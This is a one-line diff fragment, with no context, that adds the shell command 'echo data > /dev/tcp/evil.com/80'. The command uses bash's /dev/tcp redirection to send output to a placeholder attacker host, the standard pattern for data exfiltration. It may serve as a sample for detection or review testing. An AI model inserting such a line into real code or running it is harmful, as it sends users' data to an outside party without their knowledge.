@@ -1,0 +1,1 @@
+echo data > /dev/tcp/evil.com/80
